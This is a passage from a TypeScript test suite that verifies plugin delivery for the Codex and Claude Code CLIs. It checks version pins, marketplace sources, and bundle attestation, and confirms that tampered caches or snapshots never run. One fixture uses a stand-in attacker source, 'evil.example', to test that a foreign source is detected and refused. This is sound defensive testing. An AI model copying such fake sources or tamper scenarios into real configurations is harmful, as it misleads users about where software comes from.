        [HOST_CLI_SPECIFICATION.claude.package]: { version: HOST_CLI_SPECIFICATION.claude.version },
      },
      error: { code: "ELSPROBLEMS" },
    });
    const { runtime, calls } = fakeRuntime({ npmExit: 1, npmBody: plausible });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("PREFLIGHT_FAILED");
    expect(proof.reasons).toContain("HOST_CLI_QUERY_FAILED");
    // The body carried the right versions; parsing it would have manufactured the authority.
    expect(mutatingHostCalls(calls)).toEqual([]);
    expect(launchedPayloads(calls)).toEqual([]);
  });

  test("a host whose pinned package is absent from npm installs nothing for that host", async () => {
    const { runtime, calls } = fakeRuntime({
      globalVersions: { [HOST_CLI_SPECIFICATION.claude.package]: HOST_CLI_SPECIFICATION.claude.version },
    });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_CLI_PACKAGE_ABSENT");
    expect(mutatingHostCalls(calls, "codex")).toEqual([]);
    expect(launchedPayloads(calls).some((entry) => entry.includes("codex"))).toBe(false);
    // The other host is unaffected: the gate is per-host once the global preflight holds.
    expect(mutatingHostCalls(calls, "claude").length).toBeGreaterThan(0);
  });

  test("a host whose npm version diverges from the pin installs nothing for that host", async () => {
    const { runtime, calls } = fakeRuntime({
      globalVersions: {
        [HOST_CLI_SPECIFICATION.codex.package]: "0.148.0",
        [HOST_CLI_SPECIFICATION.claude.package]: HOST_CLI_SPECIFICATION.claude.version,
      },
    });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_CLI_VERSION_MISMATCH");
    expect(mutatingHostCalls(calls, "codex")).toEqual([]);
  });

  test("a host whose binary banner diverges installs nothing for that host", async () => {
    // npm resolves the pin, but the binary that answers on PATH is another one.
    const { runtime, calls } = fakeRuntime({ cliVersions: { claude: "9.9.9" } });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.claude.cli.resolvedVersion).toBe(HOST_CLI_SPECIFICATION.claude.version);
    expect(proof.hosts.claude.cli.reportedVersion).toBe("9.9.9");
    expect(proof.hosts.claude.reasons).toContain("HOST_CLI_VERSION_MISMATCH");
    expect(mutatingHostCalls(calls, "claude")).toEqual([]);
    expect(launchedPayloads(calls).some((entry) => entry.includes("claude"))).toBe(false);
  });

  test.each([
    ["foreign source", { codexSource: "https://evil.example/hoklims/semctx.git" }, "MARKETPLACE_SOURCE_MISMATCH"],
    ["wrong Codex ref_name", { codexRef: "main" }, "MARKETPLACE_REF_UNEXPECTED"],
  ] as const)("a Codex %s is diagnosed but never executed", async (_label, options, reason) => {
    const { runtime, calls } = fakeRuntime(options);
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.hosts.codex.reasons).toContain(reason);
    expect(launchedPayloads(calls).some((entry) => entry.includes(`${join("exec", "codex-")}`))).toBe(false);
  });

  test.each([
    ["wrong marketplace commit", { marketplaceRevision: "4".repeat(40) }, "MARKETPLACE_COMMIT_MISMATCH"],
    ["wrong installed version", { cacheVersion: "9.9.9" }, "INSTALLED_VERSION_MISMATCH"],
    ["wrong manifest version", { manifestVersion: "9.9.9" }, "MANIFEST_VERSION_MISMATCH"],
    ["disabled plugin", { pluginDisabled: ["codex", "claude"] as ProofHost[] }, "PLUGIN_NOT_RESOLVED"],
  ] as const)("a %s executes no delivered payload", async (_label, options, reason) => {
    const { runtime, calls } = fakeRuntime(options);
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.reasons).toContain(reason);
    expect(launchedPayloads(calls)).toEqual([]);
  });

  test("Codex obtains stable from snapshot ref_name, not an invented marketplace-list ref", async () => {
    const { runtime } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.hosts.codex.marketplaceRef).toBe("stable");
    expect(proof.hosts.codex.ok).toBe(true);
  });

  test("an incidental Codex list ref cannot override snapshot ref_name", async () => {
    const { runtime } = fakeRuntime({ codexListRef: "main", codexRef: "stable" });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.hosts.codex.marketplaceRef).toBe("stable");
    expect(proof.hosts.codex.reasons).not.toContain("MARKETPLACE_REF_UNEXPECTED");
  });

  test("the preflight and identity decisions are the ones the gates actually consult", () => {
    const good = { release: RELEASE, checkout: checkout(), witnesses: witnesses(), resolution: { ok: true, packages: {} } };
    expect(evaluatePreflight(good)).toEqual({ ok: true, reasons: [] });
    expect(evaluatePreflight({ ...good, release: { ...RELEASE, tag: "v9.9.9" } }).reasons)
      .toContain("RELEASE_TAG_VERSION_MISMATCH");
    expect(evaluatePreflight({ ...good, checkout: checkout({ head: null }) }).ok).toBe(false);
    expect(evaluatePreflight({ ...good, resolution: { ok: false, packages: {} } }).reasons)
      .toContain("HOST_CLI_QUERY_FAILED");
    expect(cliIdentityProven(cli("codex"))).toBe(true);
    expect(cliIdentityProven(cli("codex", { packagePresent: false, resolvedVersion: null }))).toBe(false);
    expect(cliIdentityProven(cli("codex", { reportedVersion: "0.0.1" }))).toBe(false);
  });
});

describe("hostile 14 — what executes is a fresh copy of the attested bytes, not the cache", () => {
  test("each smoke is launched from its own orchestrator-owned copy, never from the host cache", async () => {
    const { runtime, calls } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(true);
    for (const name of PROOF_HOSTS) {
      const snapshots = proof.hosts[name].executionSnapshots;
      expect(snapshots.cli).not.toBeNull();
      expect(snapshots.mcp).not.toBeNull();
      expect(snapshots.cli).not.toBe(snapshots.mcp);
      for (const snapshot of [snapshots.cli!, snapshots.mcp!]) {
        expect(isWithinRoot(snapshot, SANDBOX)).toBe(true);
        expect(isWithinRoot(snapshot, proof.hosts[name].cachePath!)).toBe(false);
      }
      const cliPath = join(snapshots.cli!, "dist", "semctx.js");
      const mcpPath = join(snapshots.mcp!, "dist", "semctx-mcp.js");
      const cliCalls = calls.filter((call) => call.command[0] === "bun" && call.command[2] === "doctor");
      const mcpCalls = calls.filter((call) => call.command[0] === "bun" && call.command[2] === "<mcp>");
      expect(cliCalls.some((call) => call.command[1] === cliPath)).toBe(true);
      expect(mcpCalls.some((call) => call.command[1] === mcpPath)).toBe(true);
      expect(cliCalls.some((call) => isWithinRoot(call.command[1] ?? "", snapshots.mcp!))).toBe(false);
      expect(mcpCalls.some((call) => isWithinRoot(call.command[1] ?? "", snapshots.cli!))).toBe(false);
    }
    const launched = launchedPayloads(calls);
    expect(launched.length).toBeGreaterThan(0);
    for (const entry of launched) {
      expect(entry).toContain(join("exec"));
      expect(isWithinRoot(entry, CLAUDE_CACHE_ROOT)).toBe(false);
      expect(isWithinRoot(entry, CODEX_CACHE_ROOT)).toBe(false);
    }
  });

  test("both execution copies carry the whole coherent bundle set, each matching the witness", async () => {
    const { runtime, blobs } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    for (const name of PROOF_HOSTS) {
      for (const snapshot of Object.values(proof.hosts[name].executionSnapshots)) {
        expect(snapshot).not.toBeNull();
        for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
          const copied = blobs.get(join(snapshot!, "dist", bundle));
          expect(copied).toBeDefined();
          expect(sha256Hex(new TextDecoder().decode(copied!))).toBe(WITNESS_FROM_COMMIT[bundle]!);
        }
      }
    }
  });

  test("a cache rewritten in place right after attestation cannot change what runs", async () => {
    // The host rewrites every bundle the instant the proof has read it. A design that re-read the
    // cache to launch it — however carefully it re-checked the path — would execute those bytes.
    const { runtime, calls, blobs } = fakeRuntime({ rewriteAfterAttestation: true });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(true);
    for (const name of PROOF_HOSTS) {
      for (const snapshot of Object.values(proof.hosts[name].executionSnapshots)) {
        for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
          const executed = blobs.get(join(snapshot!, "dist", bundle))!;
          expect(new TextDecoder().decode(executed)).toBe(`committed:${bundle}`);
        }
      }
      // The cache now holds different bytes — and nothing was launched from it.
      expect(runtime.digestFile(join(proof.hosts[name].cachePath!, "dist", "semctx.js")))
        .toBe(sha256Hex("rewritten:semctx.js"));
    }
    for (const entry of launchedPayloads(calls)) {
      expect(isWithinRoot(entry, CLAUDE_CACHE_ROOT)).toBe(false);
      expect(isWithinRoot(entry, CODEX_CACHE_ROOT)).toBe(false);
    }
  });

  test("a CLI smoke cannot rewrite the later MCP execution copy", async () => {
    const { runtime, blobs } = fakeRuntime({ rewriteExecutionCopiesAfterCli: true });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(true);
    for (const name of PROOF_HOSTS) {
      const { cli, mcp } = proof.hosts[name].executionSnapshots;
      expect(cli).not.toBeNull();
      expect(mcp).not.toBeNull();
      expect(cli).not.toBe(mcp);
      // The already-consumed CLI copy was hostilely rewritten. The later MCP copy was created from
      // the original attested buffers only after that process returned and still matches the witness.
      expect(new TextDecoder().decode(blobs.get(join(cli!, "dist", "semctx.js"))!))
        .toContain("rewritten-after-cli:");
      for (const bundle of PLUGIN_RUNTIME_BUNDLES) {
        const mcpBytes = blobs.get(join(mcp!, "dist", bundle));
        expect(mcpBytes).toBeDefined();
        expect(sha256Hex(new TextDecoder().decode(mcpBytes!))).toBe(WITNESS_FROM_COMMIT[bundle]!);
      }
    }
  });

  test("a snapshot that does not reproduce the attested bytes executes nothing", async () => {
    const { runtime, calls } = fakeRuntime();
    const corrupting: DeliveryProofRuntime = {
      ...runtime,
      writeBytes(target, bytes) {
        runtime.writeBytes(target, target.includes("dist") ? new TextEncoder().encode("corrupt") : bytes);
      },
    };
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, corrupting);
    expect(proof.ok).toBe(false);
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].reasons).toContain("EXECUTION_SNAPSHOT_FAILED");
      expect(proof.hosts[name].executionSnapshots).toEqual({ cli: null, mcp: null });
    }
    expect(launchedPayloads(calls)).toEqual([]);
  });

  test("an unattested payload never reaches the snapshot stage at all", async () => {
    const { runtime, calls } = fakeRuntime({ tamperedBundles: ["semctx.js"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].attested).toBe(false);
      expect(proof.hosts[name].executionSnapshots).toEqual({ cli: null, mcp: null });
      expect(proof.hosts[name].reasons).toContain("BUNDLE_NOT_ATTESTED");
    }
    expect(launchedPayloads(calls)).toEqual([]);
  });
});

describe("hostile 15 — the ledger states its own scope", () => {
  test("the artifact separates imposed confinement from observed paths and names the gap", () => {
    const proof = proveWith();
    expect(proof.isolation.environmentConfinement).toBe("imposed");
    expect(proof.isolation.observedScope).toBe("orchestrator-direct-access-only");
    // The honest part: there is no OS-level sandbox, so an absent entry is not proof about a child.
    expect(proof.isolation.syscallSandbox).toBe("none");
    expect(typeof proof.isolation.orchestratorPaths).toBe("number");
  });

  test("a direct orchestrator access to a forbidden root still fails the run", () => {
    const proof = proveWith({}, { ledger: [{ operation: "read", path: join(REAL_CLAUDE_HOME, "x.json") }] });
    expect(proof.ok).toBe(false);
    expect(proof.isolation.reasons).toContain("PROTECTED_ROOT_TOUCHED");
  });
});

describe("proof contract", () => {
  test("declares the exact runtime bundle set the plugins ship", () => {
    expect([...PLUGIN_RUNTIME_BUNDLES].sort()).toEqual([
      "semctx-index-worker.js",
      "semctx-mcp.js",
      "semctx-shared.js",
      "semctx.js",
    ]);
  });

  test("pins both host CLIs in the repository rather than in a mutable workflow variable", () => {
    expect(HOST_CLI_SPECIFICATION.codex).toEqual({
      package: "@openai/codex",
      version: "0.147.0",
      specifier: "@openai/codex@0.147.0",
    });
    expect(HOST_CLI_SPECIFICATION.claude).toEqual({
      package: "@anthropic-ai/claude-code",
      version: "2.1.229",
      specifier: "@anthropic-ai/claude-code@2.1.229",
    });
    for (const name of PROOF_HOSTS) {
      const specification = HOST_CLI_SPECIFICATION[name];
      expect(specification.specifier).toBe(`${specification.package}@${specification.version}`);
      expect(specification.version).toMatch(/^\d+\.\d+\.\d+$/);
    }
  });

  test("normalises a version banner to the semver token it contains", () => {
    expect(normaliseCliVersion("codex-cli 0.147.0")).toBe("0.147.0");
    expect(normaliseCliVersion("2.1.229 (Claude Code)")).toBe("2.1.229");
    expect(normaliseCliVersion("1.2.3-beta.1")).toBe("1.2.3-beta.1");
    expect(normaliseCliVersion("no version here")).toBeNull();
    expect(normaliseCliVersion(null)).toBeNull();
  });

  test("resolves the release identity from the tag workflow environment", () => {
    expect(releaseFromEnvironment({ GITHUB_SHA: RELEASE.sha, GITHUB_REF_NAME: "v1.2.3" })).toEqual(RELEASE);
  });

  test("a non-ok proof exits non-zero", () => {
    expect(proofExitCode(proveWith({ codex: { pluginResolved: false } }))).toBe(1);
  });
});

// --- The CLI smoke's exit-1 contract ------------------------------------------------------------

function doctorReport(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    healthy: false,
    version: RELEASE.version,
    checks: [
      { name: "cli", ok: true, detail: `semctx ${RELEASE.version}` },
      { name: "workspace", ok: false, detail: "run 'semctx init'" },
      { name: "runtime", ok: true, detail: "bun 1.4.0" },
    ],
    ...overrides,
  };
}

describe("hostile 16 — a CLI smoke's exit 1 is a runtime verdict, not a workspace verdict", () => {
  // Anti-vacuity: this is the exact HOK-582 shape — doctor exits 1 solely because the foreign
  // fixture was never `semctx init`-ed. If this ever reads as broken, the whole boundary is void.
  test("exit 1 with a red workspace but green cli/runtime checks is accepted", () => {
    const report = evaluateCliSmokeReport(JSON.stringify(doctorReport()), RELEASE.version, "detail");
    expect(report.ok).toBe(true);
    expect(report.ran).toBe(true);
  });

  test("exit 1 with a red cli check is refused", () => {
    const report = evaluateCliSmokeReport(
      JSON.stringify(doctorReport({ checks: [
        { name: "cli", ok: false, detail: "broken" },
        { name: "runtime", ok: true, detail: "bun 1.4.0" },
      ] })),
      RELEASE.version,
      "detail",
    );
    expect(report.ok).toBe(false);
    expect(report.detail).toContain("cli");
  });

  test("exit 1 with the runtime check missing entirely is refused, not treated as an absence", () => {
    const report = evaluateCliSmokeReport(
      JSON.stringify(doctorReport({ checks: [{ name: "cli", ok: true, detail: "ok" }] })),
      RELEASE.version,
      "detail",
    );
    expect(report.ok).toBe(false);
    expect(report.detail).toContain("runtime");
  });

  test("duplicate required checks are refused even when the first duplicate is green", () => {
    const report = evaluateCliSmokeReport(
      JSON.stringify(doctorReport({ checks: [
        { name: "cli", ok: true, detail: "ok" },
        { name: "runtime", ok: true, detail: "first" },
        { name: "runtime", ok: false, detail: "contradiction" },
      ] })),
      RELEASE.version,
      "detail",
    );
    expect(report.ok).toBe(false);
    expect(report.detail).toContain("duplicate runtime");
  });

  test("exit 1 with the wrong version is refused even when every check is green", () => {
    const report = evaluateCliSmokeReport(JSON.stringify(doctorReport({ version: "9.9.9" })), RELEASE.version, "detail");
    expect(report.ok).toBe(false);
    expect(report.detail).toContain("9.9.9");
  });

  test("an unparseable exit-1 report is refused, not treated as an absent check", () => {
    expect(evaluateCliSmokeReport("{not json", RELEASE.version, "detail").ok).toBe(false);
    expect(evaluateCliSmokeReport(JSON.stringify(["not", "an", "object"]), RELEASE.version, "detail").ok).toBe(false);
    expect(evaluateCliSmokeReport(JSON.stringify(doctorReport({ checks: "nope" })), RELEASE.version, "detail").ok)
      .toBe(false);
  });

  test("a live smoke passes on exit 1 with a red workspace, and fails on any other exit code", async () => {
    const green = fakeRuntime({ cliExit: 1, doctorPayload: doctorReport() });
    const passed = await runStableDeliveryProof(LIVE_OPTIONS, green.runtime);
    expect(passed.reasons).not.toContain("CLI_SMOKE_FAILED");
    expect(passed.hosts.codex.cliSmoke.ok).toBe(true);

    const brokenRuntime = fakeRuntime({ cliExit: 2, doctorPayload: doctorReport() });
    const broken = await runStableDeliveryProof(LIVE_OPTIONS, brokenRuntime.runtime);
    expect(broken.reasons).toContain("CLI_SMOKE_FAILED");

    const redCli = fakeRuntime({
      cliExit: 1,
      doctorPayload: doctorReport({ checks: [
        { name: "cli", ok: false, detail: "broken" },
        { name: "runtime", ok: true, detail: "bun 1.4.0" },
      ] }),
    });
    const redCliProof = await runStableDeliveryProof(LIVE_OPTIONS, redCli.runtime);
    expect(redCliProof.reasons).toContain("CLI_SMOKE_FAILED");
  });

  test("exit 0 still refuses an unreadable, wrong-version or runtime-red report", async () => {
    const unreadable = cliSmoke(
      fakeRuntime({ doctorPayload: "not-json" }).runtime,
      "dist/semctx.js",
      LIVE_OPTIONS,
      { PATH: "/usr/bin" },
    );
    expect(unreadable.ok).toBe(false);

    const wrongVersion = cliSmoke(
      fakeRuntime({ doctorPayload: doctorReport({ version: "9.9.9" }) }).runtime,
      "dist/semctx.js",
      LIVE_OPTIONS,
      { PATH: "/usr/bin" },
    );
    expect(wrongVersion.ok).toBe(false);

    const runtimeRed = cliSmoke(
      fakeRuntime({ doctorPayload: doctorReport({ checks: [
        { name: "cli", ok: true, detail: "ok" },
        { name: "runtime", ok: false, detail: "broken" },
      ] }) }).runtime,
      "dist/semctx.js",
      LIVE_OPTIONS,
      { PATH: "/usr/bin" },
    );
    expect(runtimeRed.ok).toBe(false);
  });

  test("bounded output keeps short text verbatim and truncates long text with a character marker", () => {
    expect(boundedCommandOutput("short")).toBe("short");
    const long = "x".repeat(5000);
    const bounded = boundedCommandOutput(long);
    expect(bounded.length).toBeLessThan(long.length);
    expect(bounded).toContain("truncated");
    expect(bounded.startsWith("x".repeat(100))).toBe(true);
  });

  test("cliSmoke wires the report gate to the actual doctor invocation", async () => {
    const { runtime } = fakeRuntime({ cliExit: 1, doctorPayload: doctorReport() });
    const outcome = cliSmoke(runtime, "dist/semctx.js", LIVE_OPTIONS, { PATH: "/usr/bin" });
    expect(outcome.ran).toBe(true);
    expect(outcome.ok).toBe(true);
  });
});

describe("hostile 17 — a failed install is diagnosed, never silently reduced to a bare reason", () => {
  test("a refused install archives every attempted command with its argv, exit code and output", async () => {
    const { runtime } = fakeRuntime({ failingInstall: ["codex"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.hosts.codex.reasons).toContain("HOST_INSTALL_FAILED");
    expect(proof.hosts.codex.installAttempts.length).toBeGreaterThan(0);
    const failed = proof.hosts.codex.installAttempts.at(-1);
    expect(failed?.code).not.toBe(0);
    expect(failed?.argv[0]).toBe("codex");
    expect(failed?.stderr).toContain("install refused");
  });

  test("a successful install still archives every command it actually ran", async () => {
    const { runtime } = fakeRuntime();
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(true);
    for (const name of PROOF_HOSTS) {
      expect(proof.hosts[name].installAttempts).toEqual(installCommands(name).map((argv) => ({
        argv,
        code: 0,
        stdout: "{}",
        stderr: "",
      })));
    }
  });
});
